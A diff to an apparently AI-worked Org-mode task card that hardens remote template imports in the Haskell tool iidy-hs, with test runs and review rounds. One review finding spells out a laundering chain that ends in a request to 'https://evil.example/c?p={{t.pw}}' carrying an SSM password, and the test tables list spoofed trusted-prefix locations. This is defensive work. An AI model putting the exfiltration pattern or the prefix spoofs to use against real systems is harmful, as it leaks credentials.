@@ -11,10 +11,33 @@
 :ID: org:01a1e691-4779-7682-a0c5-968ca1130db7
 :ADDED: [2026-11-16 Mon 15:54]
 :END:
+:CLOCK:
+CLOCK: [2026-11-16 Mon 18:06]--[2026-11-16 Mon 18:26] => 0:20
+CLOCK: [2026-11-16 Mon 18:33]--[2026-11-16 Mon 18:50] => 0:17
+CLOCK: [2026-11-16 Mon 18:53]--[2026-11-16 Mon 18:54] => 0:01
+:END:
 :LOGBOOK:
 - Card state TODO → STARTED [2026-11-16 Mon 16:11]
   Agent: opus-5.5-medium
   Session-ID: 113e42ab-bf76-4434-899c-00879502d398
+- Clock-in [2026-11-16 Mon 18:06]
+  Agent: opus-5.5-medium
+  Session-ID: 113e42ab-bf76-4434-899c-00879502d398/agent:a705648c00601743a
+- Clock-out [2026-11-16 Mon 18:26]
+  Agent: opus-5.5-medium
+  Session-ID: 113e42ab-bf76-4434-899c-00879502d398/agent:a705648c00601743a
+- Clock-in [2026-11-16 Mon 18:33]
+  Agent: opus-5.5-medium
+  Session-ID: 113e42ab-bf76-4434-899c-00879502d398/agent:a705648c00601743a
+- Clock-out [2026-11-16 Mon 18:50]
+  Agent: opus-5.5-medium
+  Session-ID: 113e42ab-bf76-4434-899c-00879502d398/agent:a705648c00601743a
+- Clock-in [2026-11-16 Mon 18:53]
+  Agent: opus-5.5-medium
+  Session-ID: 113e42ab-bf76-4434-899c-00879502d398/agent:a705648c00601743a
+- Clock-out [2026-11-16 Mon 18:54]
+  Agent: opus-5.5-medium
+  Session-ID: 113e42ab-bf76-4434-899c-00879502d398/agent:a705648c00601743a
 :END:
 #+title: C15 — Redesign what remote templates may inherit and import
 #+date: 2026-11-16
@@ -68,14 +91,14 @@ restoring Rust's bare-relative-import inheritance from remote documents
 =!$escaped= side finding in the options report; any new dependency.
 
 Done when:
-- [ ] Every imported document, local or remote, is resolved without the
+- [X] Every imported document, local or remote, is resolved without the
   importing document's variables (Rust =src/yaml/engine.rs:409=); a test
   shows a parent variable is not visible and the error names it.
 - [ ] Custom resource templates loaded from untrusted locations expand
   with their parameters only, for both resource-type use and =!$expand=;
   local and trusted-source templates keep the parent's variables (Rust
   parity); tests cover all three cases at both sites.
-- [ ] Untrusted documents cannot import =ssm:=, =ssm-path:=, =cfn:= or
+- [X] Untrusted documents cannot import =ssm:=, =ssm-path:=, =cfn:= or
   =s3:= (both =s3:= forms); local documents and documents under a trusted
   prefix can; table-driven tests cross untrusted bases with each type.
 - [ ] HTTP imports requested by untrusted documents cannot reach
@@ -247,10 +270,15 @@ accepted, unless marked otherwise.
   lacks, since it can write the absolute URL, so Tavis may prefer parity;
   that would be a separate card.
 
-* TODO Isolate imported documents from parent variables
+* DONE Isolate imported documents from parent variables
 :PROPERTIES:
 :ID: org:01a1e6fe-2be7-72bd-983a-90cdfb79ef65
 :ADDED: [2026-11-16 Mon 17:52]
+:END:
+:LOGBOOK:
+- State "DONE"       from "TODO" [2026-11-16 Mon 18:09] \\
+  Agent: opus-5.5-medium
+  Session-ID: 113e42ab-bf76-4434-899c-00879502d398/agent:a705648c00601743a
 :END:
 Rust parity, no =DIVERGENCES.md= entry. In =src/Iidy/Yaml/Engine.hs=, drop
 the =env= argument of =processImportedDoc= (=:214-223=, called at =:199=)
@@ -430,10 +458,38 @@ custom-template isolation, (7) C4 regression test, (8) docs.
     own modules (trusted-source parsing, HTTP guard, exfiltration);
     Done-when has an item for it. =Cli/Parser.hs= gets no split.
 
-* TODO Add the trust policy next to isLocalBase and thread it to the dispatcher
+** Implementation 2026-11-16
+:PROPERTIES:
+:ID: org:01a1e70c-35f8-7533-bbd0-f133ba5840e5
+:ADDED: [2026-11-16 Mon 18:08]
+:END:
+By worker claude-C15. =processImportedDoc= no longer takes the parent's
+environment; the child's =loadImportsAndDefs= starts from =Map.empty=
+(Rust =engine.rs:409=). Tests in =test/Test/EngineTest.hs= group
+"Imported document variable isolation" (every child carries =$defs=).
+
+Failing on the branch base (=284e72b=), test change only:
+#+begin_example
+child cannot read a parent $defs value: FAIL
+  child read the parent's secret: Object (fromList [("out",String "")])
+child cannot interpolate a parent variable into its import location: FAIL
+  a load request carried the secret: ["s3cr3t.yaml","child.yaml"]
+child still resolves its own $defs: OK
+2 out of 3 tests failed
+#+end_example
+With the fix the full suite passes; no fixture or test derived from Rust
+depended on an imported document seeing parent variables (stop rule not
+hit).
+
+* DONE Add the trust policy next to isLocalBase and thread it to the dispatcher
 :PROPERTIES:
 :ID: org:01a1e6fe-2be7-72bd-983a-90cc07412e3a
 :ADDED: [2026-11-16 Mon 17:52]
+:END:
+:LOGBOOK:
+- State "DONE"       from "TODO" [2026-11-16 Mon 18:13] \\
+  Agent: opus-5.5-medium
+  Session-ID: 113e42ab-bf76-4434-899c-00879502d398/agent:a705648c00601743a
 :END:
 No behaviour change. In =src/Iidy/Yaml/Imports/Types.hs=, beside
 =isLocalBase= (=:131-134=): =TrustedSources= (validated prefixes) with
@@ -463,10 +519,45 @@ literals at =app/Main.hs:142-268= map one to one. Table tests for
 case, in a new module (for example =test/Test/TrustedSourceTest.hs=), not
 in =ImportTrustTest.hs=.
 
-* TODO Add the --trust-import-source flag
+** Implementation 2026-11-16
+:PROPERTIES:
+:ID: org:01a1e71c-873a-75f7-afa4-61bb56a050e8
+:ADDED: [2026-11-16 Mon 18:26]
+:END:
+By worker claude-C15. Behaviour-neutral refactor plus the trust primitives.
+Owners extended (one place each):
+- =src/Iidy/Yaml/Imports/Types.hs=: =TrustedSource= / =TrustedSources=
+  (=noTrustedSources=, =mkTrustedSources=, =trustedSourceList=),
+  =parseTrustedSource=, and the one trust decision =isTrustedBase=
+  (=isLocalBase= or under a listed prefix), next to =isLocalBase=;
+  =ImportPolicy= (=ipRemoteImports=, =ipTrustedSources=) and
+  =importPolicy= (a policy with no trusted sources).
+- =src/Iidy/Cli.hs=: =importPolicyFromOpts= replaces the six copies of
+  =if goRemoteImports ...=.
+- =src/Iidy/Yaml/Imports/Loaders/Dispatch.hs=: =ImportConfig= carries
+  =icPolicy=; =mkImportConfig= is the one constructor, used at every
+  construction site (source and tests).
+- =src/Iidy/Cfn/Context.hs=: =cfnImportPolicy= replaces
+  =cfnRemoteImports=; =cfnImportConfig= builds =ImportConfig= for
+  =RequestBuilder= (three sites), =EstimateCost=, =LintTemplate= and
+  =TemplateApproval=.
+Prefix rules beyond the decision text (fail-closed, same spirit): the
+short =s3:= form must also name a bucket (=s3:/= is refused, since it
+would match every =s3://= location), and =.= / =..= path segments,
+including percent-encoded, are refused in a prefix and make a location
+under a prefix untrusted (they could climb out of the prefix). Tests:
+=test/Test/TrustedSourceTest.hs= (accept / reject / trust tables,
+including =https://t.example.com/= vs =https://t.example.com.evil/=).
+
+* DONE Add the --trust-import-source flag
 :PROPERTIES:
 :ID: org:01a1e6fe-2be7-72bd-983a-90c80ff65b52
 :ADDED: [2026-11-16 Mon 17:52]
+:END:
+:LOGBOOK:
+- State "DONE"       from "TODO" [2026-11-16 Mon 18:15] \\
+  Agent: opus-5.5-medium
+  Session-ID: 113e42ab-bf76-4434-899c-00879502d398/agent:a705648c00601743a
 :END:
 New flag, iidy-hs only. Behaviour-neutral until a gate exists; it lands
 before the gates so main keeps an escape hatch while tasks 4-6 land, and
@@ -479,10 +570,30 @@ a repeatable option next to =--no-remote-imports= (=:137-141=) with
 Update =test/Test/Shared.hs:547= and the parser tests. Tests: repeated
 flags accumulate into the policy, an invalid prefix is a parse error.
 
-* TODO Block AWS-backed imports from untrusted documents
+** Implementation 2026-11-16
+:PROPERTIES:
+:ID: org:01a1e71c-873a-75f7-afa4-61baf94321cd
+:ADDED: [2026-11-16 Mon 18:26]
+:END:
+By worker claude-C15. =GlobalOpts= gains =goTrustedSources=
+(=[TrustedSource]=, validated by =parseTrustedSource= as the option
+reader, so an invalid prefix is a command-line error);
+=importPolicyFromOpts= fills =ipTrustedSources=; help row in
+=Cli/Help.hs=. Tests in =test/Test/CliParserTest.hs=: absent by default,
+repeated flags accumulate into the policy, invalid prefixes fail to
+parse. Behaviour-neutral until a gate uses the trusted sources. =iidy
+demo= does not forward the flag to the commands it runs (it forwards only
+=--no-remote-imports=); left as is, not settled by the card.
+
+* DONE Block AWS-backed imports from untrusted documents
 :PROPERTIES:
 :ID: org:01a1e6fe-2be7-72bd-983a-90cbb0dbebbc
 :ADDED: [2026-11-16 Mon 17:52]
+:END:
+:LOGBOOK:
+- State "DONE"       from "TODO" [2026-11-16 Mon 18:19] \\
+  Agent: opus-5.5-medium
+  Session-ID: 113e42ab-bf76-4434-899c-00879502d398/agent:a705648c00601743a
 :END:
 New divergence. In =Types.hs=: =isAwsBacked= (=ImportCfn=, =ImportSsm=,
 =ImportSsmPath=, =ImportS3=), defined once; =GetImport.needsAwsEnv=
@@ -501,6 +612,379 @@ trusted-source module from task 2), a local base and a base under a
 flag-built trusted prefix still allowed, and the engine-level
 =nestedMatrix= pattern (=mkFullDispatcher= with a test config) for a
 remote document importing =ssm:=.
+
+** Implementation 2026-11-16
+:PROPERTIES:
+:ID: org:01a1e71c-873a-75f7-afa4-61b97b4eac17
+:ADDED: [2026-11-16 Mon 18:26]
+:END:
+By worker claude-C15. Owners extended in =src/Iidy/Yaml/Imports/Types.hs=:
+=isAwsBacked= (the one classification of =cfn:=, =ssm:=, =ssm-path:=,
+=s3:=); =needsAwsEnv= moved here from =Iidy.GetImport= and rewritten over
+=isAwsBacked= (=GetImport= and =GetImportTest= import it from =Types=);
+=checkImport= = =parseImportType= plus the AWS-backed check against
+=isTrustedBase=. The error names the import type and the base and
+suggests =--trust-import-source=. =mkFullDispatcher= calls =checkImport=
+with =ipTrustedSources (icPolicy cfg)= in place of =parseImportType=, so
+the gate runs before =withAwsEnv=; comments in =Dispatch.hs= updated.
+
+Supervisor note (C17's =isAwsImport= in =Cfn/StackArgsBootstrap.hs=):
+done on the rebase onto main after C17 landed. =isAwsImport= now takes
+the =ImportPolicy= and is =needsAwsEnv= (over =isAwsBacked=) applied to
+=checkImport=, so an import the gate refuses never builds the AWS
+environment (the user sees the trust error, not a credential-field
+error); =StackArgsBootstrap= no longer imports =Iidy.GetImport=. Not
+separately tested: =loadStackArgsBootstrapped= builds its dispatcher
+internally, so a stack-args file importing a remote document has no
+stub seam.
+
+Tests:
+- =test/Test/ImportTrustTest.hs=: the old "untrusted parent keeps
+  non-local imports" matrix is split; random and HTTP stay allowed
+  (pure), and the new =untrustedAwsMatrix= runs every untrusted base
+  against each AWS-backed import through the real dispatcher with a mock
+  AWS env and expects a refusal and no AWS request (the decided change).
+- New =test/Test/AwsImportGateTest.hs=: local bases and bases under
+  flag-built trusted prefixes (built by the real CLI parser, via the new
+  helper module =test/Test/ImportFixtures.hs=) pass the gate and =ssm:=
+  resolves from the mock; bases next to but outside the prefixes
+  (=t.example.com.evil=, =http:= vs =https:=, =s3://tmpl2/=, a =..=
+  segment, =ssm:/tmpl2/=, =cfn:=) are refused with the base and the flag
+  named and no AWS request; engine level, a local template importing a
+  remote document that imports =ssm:= is refused before any AWS call
+  when untrusted, and reads the mock value when the prefix is trusted.
+
+Failing run with only the =Dispatch.hs= wiring reverted (the tests need
+the new =Types.hs= exports to compile): 81 of 508 selected tests failed,
+for example
+#+begin_example
+ssm:/param from s3:bucket/dir/parent.yaml: FAIL
+  expected rejection, got ImportData {idType = ImportSsm, ...
+  idDoc = String "db.internal.example"}
+untrusted remote document is refused before any AWS call: FAIL
+  remote document read ssm: Object (fromList [("out",String "db.internal.example")])
+81 out of 508 tests failed
+#+end_example
+With the wiring the selected tests pass.
+
+** Rebase onto main and ready report 2026-11-16
+:PROPERTIES:
+:ID: org:01a1e71c-8739-74ae-9189-133ef1ffbcdb
+:ADDED: [2026-11-16 Mon 18:26]
+:END:
+By worker claude-C15. Rebased onto =827113a= (C17 closed). Conflicts, all
+inside allowed paths: =Cfn/Runner.hs= and =Cfn/StackArgsLoader.hs= (C17's
+=loadStackArgsBootstrapped= / =loadStackArgsWith= now take the
+=ImportPolicy= and use =mkImportConfig=), =Cfn/StackArgsBootstrap.hs=
+(policy threaded; =isAwsImport= as above), =test/Test/ImportLoaderTest.hs=
+and =test/Test/StackArgsBootstrapTest.hs= (=importPolicy=), and
+=ImportTrustTest.hs=. C28's new =idOrdered= field needed =idOrdered =
+Nothing= in the task 1 and task 4 test loaders. Each rebased commit was
+rebuilt and tested: task 1 by a full =-Werror= suite run before amending
+(amended without the hook, same content), tasks 2-4 through the
+pre-commit hook. Full suite on the rebased tip: 1924 tests passed.
+Commits: =8133a7a= (task 1), =884fb3f= (task 2), =009e4a9= (task 3),
+=502a742= (task 4).
+
+** Review 2026-11-16 (tasks 1-4)
+:PROPERTIES:
+:ID: org:01a1e722-3077-76e4-a2ff-ff452d8c5097
+:ADDED: [2026-11-16 Mon 18:32]
+:END:
+By the review worker. Branch =claude/C15= at =502a742=, base =827113a=.
+
+Verdicts: =8133a7a= (task 1) land; =884fb3f= (task 2) land; =009e4a9=
+(task 3) land; =502a742= (task 4) land, with defect 1 for the
+supervisor's call before the card closes and defects 2-4 as small
+follow-ups (any later C15 task may carry them).
+
+Checks run:
+- =8133a7a= was amended with =--no-verify=: fourmolu and hlint on its
+  two files are clean; fourmolu =--mode check= and hlint on the tip's
+  =src/ app/ test/= are clean.
+- Task 1 with =src/Iidy/Yaml/Engine.hs= reverted to =8133a7a^= (tests
+  kept): "child cannot read a parent $defs value" and "child cannot
+  interpolate a parent variable into its import location" FAIL, "child
+  still resolves its own $defs" OK (2 of 3 failed). Restored.
+- Task 4 with =Dispatch.hs= reverted to =502a742^= (the gate wiring; the
+  =Types.hs= exports must stay for the tests to compile): 81 of 122
+  selected tests fail (=untrustedAwsMatrix=, =refusedMatrix=, the
+  untrusted engine case), matching the worker's record. Restored.
+- Task 2 is behaviour-neutral. The six replaced if-expressions
+  (=app/Main.hs= exec-changeset, approval review, demo; =Cfn/Runner.hs=;
+  =GetImport.hs=; =Render.hs=) all map =goRemoteImports= the same way via
+  =importPolicyFromOpts=, which had =noTrustedSources= in that commit.
+  The =BlockRemoteImports= literals in =app/Main.hs= map one to one to
+  =importPolicy BlockRemoteImports=. Every =ImportConfig= site (Render,
+  GetImport, RequestBuilder x3, EstimateCost, LintTemplate,
+  TemplateApproval, StackArgsLoader, StackArgsBootstrap, Demo) now goes
+  through =mkImportConfig= with the same env and the same remote setting;
+  the =cfn*= ones through =cfnImportConfig=. =needsAwsEnv= over
+  =isAwsBacked= is the same table as the old =GetImport= copy.
+- One owner: =isAwsBacked=, =needsAwsEnv=, =checkImport=,
+  =isTrustedBase= live only in =Iidy.Yaml.Imports.Types=; the dispatcher
+  and =StackArgsBootstrap.isAwsImport= call =checkImport=; no other trust
+  logic in =src/= or =app/= (see defect 3 for one duplicated
+  composition).
+- Gate spellings, all fail closed: =SSM:=, =Ssm:=, =S3://=, a leading
+  space or newline, =ssm := are unknown types and refused by
+  =parseTypePrefix=; both =s3:= forms classify as =ImportS3=; =./ssm:x= and
+  =file:ssm:x= are file imports, refused from remote bases by C14;
+  relative imports from remote bases are refused (C14). Variables:
+  an imported document's import locations see only its own =$defs= and
+  =$imports=, so a remote document can only build an =ssm:= location
+  from its own (remote) values, and that request carries its untrusted
+  base. =$imports= in nested documents recurse through the same
+  dispatcher with the child's location as base. Custom templates and
+  handlebars cannot load anything (=resolveAst= is pure). get-import uses
+  base =.= and does not recurse into the fetched document. With
+  =--no-remote-imports=, documents loaded through =ssm:= / =cfn:= are
+  still untrusted, and an untrusted =s3:= import gets the trust error
+  before the remote-imports error. Stack-args bootstrap: a refused import
+  builds no AWS environment.
+- Prefix matching: the location's authority must be followed by the
+  prefix's =/=, so =https://t.example.com@evil/=, =:8443=,
+  =t.example.com.evil=, =%2f= in the host and =http= vs =https= are not
+  trusted; =.=, =..=, =%2e%2e=, =.%2E= segments after the prefix
+  untrust the location; =?= / =#= cannot introduce a host. No test has
+  the userinfo case (=https://t.example.com@evil.example/a.yaml=); worth
+  one row in =trustTable=.
+
+Defects:
+1. Medium (design, needs the supervisor's call), =Types.hs= =checkImport=.
+   Trust follows the location only, so an untrusted document can launder
+   through a trusted one. With =--trust-import-source
+   https://t.example.com/= and a local template importing
+   =https://evil.example/u.yaml=, =u.yaml= may import
+   =https://t.example.com/db.yaml= (trusted, so its =ssm:/prod/db/pw= import
+   is allowed), receive the resolved value as its own variable, then
+   import =https://evil.example/c?p={{t.pw}}=. Tasks 5-6 do not close
+   this (the HTTP filter blocks only loopback and metadata). Smallest
+   fix: in =checkImport=, refuse a non-local location under a trusted
+   prefix when the base is untrusted (a document is trusted only if its
+   requester is), with a test in =AwsImportGateTest=; otherwise record it
+   as a residual risk in the docs task.
+2. Low (duplication), =test/Test/EngineTest.hs= =textDocLoader= /
+   =runParentImporting= (task 1) and =test/Test/ImportFixtures.hs=
+   =stubDocLoader= / =preprocessText= (task 4) both build =ImportData=
+   from YAML text and preprocess a template from text. Fix: give
+   =ImportFixtures= one loader serving several documents and recording
+   requests, and use it from =EngineTest=.
+3. Low (duplication), =src/Iidy/GetImport.hs:65= and
+   =src/Iidy/Cfn/StackArgsBootstrap.hs:163-168= both compute "classify,
+   then =needsAwsEnv=", =GetImport= with =parseImportType= (equal to
+   =checkImport= only because its base is =.=). Fix: one
+   =importNeedsAwsEnv :: ImportPolicy -> Text -> Text -> Bool= in =Types.hs=
+   over =checkImport=, used by both.
+4. Low, =src/Iidy/Demo.hs:306-311= =substituteIidyCommand= forwards only
+   =--no-remote-imports=; since task 4 the gate is live, so
+   =iidy --trust-import-source s3://b/ demo x.yaml= runs the script's
+   =iidy= commands without the trust and their remote documents lose
+   AWS-backed imports. Fails closed. Fix: pass the =ImportPolicy= and
+   append =--trust-import-source P= per prefix; one =DemoTest= case. (The
+   worker noted this and left it open.)
+
+Variable isolation against Rust (=engine.rs:380-442=): no parent
+variable reaches the child in either; =$envValues= is a root mapping key
+injected by the template loader, never an engine variable, so children
+see it in neither; both give the child its own location as input URI.
+Remaining differences, pre-existing and not trust leaks toward the
+child: Rust stores a child's =$params= imports in the engine-wide
+=custom_template_defs=, so they become usable at the root, while
+iidy-hs drops the child's =_docTmplDefs= (=Engine.hs:239=); Rust's
+=process_defs= / =process_imports= reject a key defined twice, iidy-hs
+lets the later one win.
+
+Not defects for this round: redirects from a trusted URL keep the
+requested location as the base (=Http.hs:81=), so the redirect rule
+belongs to task 5; stdin and locations built from remote content in a
+local template are the docs task's residual risks.
+
+** Fix round 1 (review of tasks 1-4) 2026-11-16
+:PROPERTIES:
+:ID: org:01a1e732-9071-72c2-bf0f-7b8594e77ca6
+:ADDED: [2026-11-16 Mon 18:50]
+:END:
+By worker claude-C15, on the supervisor's instructions. Rebased onto
+=d6207c1= first (task 1 landed): the =TemplateApproval.hs= conflict took
+C16's layout, and the import-config change now sits in
+=Cfn/ApprovedTemplate.hs= (=cfnImportConfig=) and
+=test/Test/MockCfnContext.hs= (=importPolicy BlockRemoteImports=).
+
+*** (a) Trust is not gained through the import chain
+:PROPERTIES:
+:ID: org:01a1e732-9071-72c2-bf0f-7b845a060e85
+:ADDED: [2026-11-16 Mon 18:50]
+:END:
+Supervisor's call: a document is trusted only if its own location is
+trusted and the document that requested it is trusted (a local root
+counts as trusted). Owner: =Types.hs= gains =ImportBase= (the requesting
+document's location plus the locations that led to it, nearest first),
+=rootBase=, =childBase= and =isTrustedRequester= (every link
+=isTrustedBase=); =checkImport= now takes the =ImportBase= and refuses
+AWS-backed imports when any link is untrusted, naming the untrusted link.
+=LoadImportFn= takes an =ImportBase= instead of the base text; the engine
+gives the root =rootBase= and each imported document =childBase= of its
+requester; the dispatcher passes =ibLocation= to the loaders. Test
+callers that used a plain file loader use =fileLoader= from
+=test/Test/ImportFixtures.hs=. For the docs task: a document under a
+trusted prefix requested (directly or further up) by an untrusted
+document is untrusted; tasks 5 and 6 use =isTrustedRequester= the same
+way (HTTP filter, custom-template parent variables).
+Failing before the fix (=AwsImportGateTest=, the review's chain:
+local -> =https://evil.example/u.yaml= -> trusted
+=https://t.example.com/r.yaml= -> =ssm:=):
+#+begin_example
+trust is not gained through an untrusted requester: FAIL
+  laundered ssm: read: Object (fromList [("out",String "db.internal.example")])
+#+end_example
+Also =TrustedSourceTest=: an =isTrustedRequester= chain table, and the
+userinfo row (=https://t.example.com@evil.example/a.yaml=) the review
+suggested.
+
+*** (b) One document stub for the engine and trust tests
+:PROPERTIES:
+:ID: org:01a1e732-9071-72c2-bf0f-7b83991230fe
+:ADDED: [2026-11-16 Mon 18:50]
+:END:
+=test/Test/ImportFixtures.hs= now has =stubDocsLoader= (several YAML
+documents by location, with a fallback), =unknownLoader= and
+=recordingLoader=; =EngineTest='s isolation tests use them with
+=preprocessText= (=textDocLoader= removed), and =ImportTrustTest= and
+=AwsImportGateTest= use =stubDocsLoader=.
+
+*** (c) One helper for "does this import need the AWS environment"
+:PROPERTIES:
+:ID: org:01a1e732-9071-72c2-bf0f-7b82f095e7c7
+:ADDED: [2026-11-16 Mon 18:50]
+:END:
+=importNeedsAwsEnv :: ImportPolicy -> Text -> ImportBase -> Bool= in
+=Types.hs=, over =checkImport= and =needsAwsEnv=. =GetImport= (base
+=rootBase "."=) and =StackArgsBootstrap= (its =isAwsImport= removed) call
+it; =GetImport= no longer calls =parseImportType=. Table test in
+=AwsImportGateTest= (local, blocked =s3:=, untrusted, trusted, laundered
+chain).
+
+*** (d) iidy demo passes the trusted sources on
+:PROPERTIES:
+:ID: org:01a1e732-9071-72c2-bf0f-7b81fa5107a4
+:ADDED: [2026-11-16 Mon 18:50]
+:END:
+=substituteIidyCommand= takes the =ImportPolicy= and appends one
+=--trust-import-source= per prefix, shell-quoted, after
+=--no-remote-imports= when that applies. =DemoTest= case with two
+prefixes, one containing a quote. Before the change the test did not
+compile (=substituteIidyCommand= took a =RemoteImports=).
+
+*** Fix round 1 ready
+:PROPERTIES:
+:ID: org:01a1e732-9070-738f-9d49-f6199a5cbb89
+:ADDED: [2026-11-16 Mon 18:50]
+:END:
+Rebased onto =466340b= (main); full suite on the tip: 1962 tests passed;
+fourmolu check and hlint clean. Branch commits (tasks 2-4, then fix
+round 1):
+- =086dcf6= C15: add the import trust policy and thread it to the dispatcher
+- =3e7c02e= C15: add the --trust-import-source flag
+- =32bbb27= C15: block AWS-backed imports from untrusted documents
+- =8d124ae= C15: do not gain import trust through an untrusted requester
+- =219a223= C15: share one document stub between the engine and trust tests
+- =799e1a8= C15: one helper decides whether an import needs the AWS environment
+- =dc14c0f= C15: iidy demo passes --trust-import-source to the commands it runs
+
+** Re-review 2026-11-16 (fix round 1)
+:PROPERTIES:
+:ID: org:01a1e735-bced-713a-83b4-ed834b1df94b
+:ADDED: [2026-11-16 Mon 18:53]
+:END:
+By the review worker. Branch =claude/C15= at =dc14c0f=, base =466340b=.
+
+Verdict: land all seven commits (=086dcf6=, =3e7c02e=, =32bbb27=,
+=8d124ae=, =219a223=, =799e1a8=, =dc14c0f=). No new defects; one
+pre-existing bug below, and two notes for later tasks.
+
+Checks run:
+- Rebase: =git range-diff 827113a..502a742 466340b..32bbb27= shows tasks
+  2-4 unchanged except the =TemplateApproval.hs= hunk moving to
+  =Cfn/ApprovedTemplate.hs= (=ImportConfig (Just (cfnEnv ctx))
+  (cfnRemoteImports ctx)= becomes =cfnImportConfig ctx=, the same
+  config) and =test/Test/MockCfnContext.hs= (=importPolicy
+  BlockRemoteImports=). Equivalent to what was approved. No
+  =ImportConfig= is built outside =mkImportConfig= in =src/= or =app/=.
+- =8d124ae= reverted in effect: its production files cannot be reverted
+  alone (the tests need =ImportBase=), so =untrustedLink= was cut back to
+  the base's own location (=[ibLocation base]=, the pre-fix rule). The
+  two chains with an untrusted middle link and "trust is not gained
+  through an untrusted requester" (the review's laundering scenario)
+  FAIL, 3 of 7 selected; the four location-only rows pass. Restored.
+- fourmolu =--mode check= and hlint on the tip's =src/ app/ test/= are
+  clean.
+- Loader type: =LoadImportFn= now takes =ImportBase=. =rootBase= is
+  called only by =Engine.process= (the root) and =GetImport= (base
+  =.=); every imported document gets =childBase= of its requester
+  (=Engine.hs= =processImports=). =StackArgsBootstrap= and the
+  dispatcher pass the =ImportBase= through unchanged; loaders below the
+  gate get =ibLocation=, which only resolves relative paths. No caller
+  drops the chain.
+- Attempts on the chain rule, all held:
+  - Re-imports of one location from trusted and untrusted requesters:
+    no document cache exists (imports load each time; the manifest only
+    records, the cycle stack is popped), so each load is gated with its
+    own chain.
+  - Custom templates: =$params= documents are loaded through the same
+    =processImports= path with the chain; expansion is pure
+    (=resolveAst=), and =$imports= inside a custom template are
+    processed only at load time, with the chain.
+  - get-import: base =rootBase "."=, one load, no recursion.
+  - Stack-args bootstrap: =importNeedsAwsEnv= uses =checkImport= with the
+    passed chain, so a refused import builds no AWS environment.
+  - Documents loaded via =ssm:= / =cfn:=: their location is untrusted
+    unless under a listed prefix, and they stay in the chain of anything
+    they import.
+  - Root: stdin (=-=) is a local, trusted root (already the docs task's
+    residual risk); a remote root is never preprocessed.
+  - The local-only gate still looks only at =ibLocation=; this is
+    enough, since an untrusted document cannot request a local
+    location.
+- Demo quoting: =shellQuote= is the standard ='...'\''...'= form and the
+  test covers a prefix with a quote; validated prefixes contain no
+  newline-specific hazard inside single quotes. The executable path
+  itself is still unquoted (pre-existing).
+
+Pre-existing bug (not this card's change):
+- =src/Iidy/Demo.hs= =getIidyExe= returns =Nothing= when the running
+  binary is the =iidy= on =PATH=, and =substituteIidyCommand cmd Nothing _=
+  then leaves the command alone, so neither =--no-remote-imports= nor
+  =--trust-import-source= is passed on. Repro: install the binary as
+  =iidy= on =PATH=, run =iidy --no-remote-imports demo script.yaml=
+  where the script runs =iidy render= on a template with an =https:=
+  import; the inner render fetches it. Fails open for
+  =--no-remote-imports=. Fix: always prefix the flags, substituting the
+  executable path or keeping =iidy=. The =DemoTest= case "no executable
+  to substitute leaves the command alone" pins the current behaviour.
+  Worth a separate card.
+
+Notes for later tasks:
+- Task 5 (HTTP filter) must decide with =isTrustedRequester= on the
+  =ImportBase=, not =isTrustedBase= on a location, or the laundering
+  chain reopens for loopback and metadata targets. The dispatcher passes
+  only =ibLocation= to the loaders today, so the HTTP loader needs the
+  base or the decision.
+- Task 6 (custom templates): =TemplateInfo= stores only the template's
+  location. Templates reach the resolver only from the root's own
+  imports (children's =_docTmplDefs= are dropped), so location trust
+  equals requester trust there today; if that ever changes, store the
+  =ImportBase= or the trust decision in =TemplateInfo=.
+
+*** Rebase after re-review
+:PROPERTIES:
+:ID: org:01a1e736-dd96-7431-984f-95b14838c9ee
+:ADDED: [2026-11-16 Mon 18:54]
+:END:
+Rebased cleanly onto =c562370= (C16 round 2); full suite 1981 passed;
+tip =f20d35f=. Reviewer's note for task 5: the HTTP filter must use the
+requester chain (=isTrustedRequester=), not only the location, or the
+laundering hole reopens for loopback and metadata addresses.
 
 * TODO Filter HTTP targets requested by untrusted documents
 :PROPERTIES:
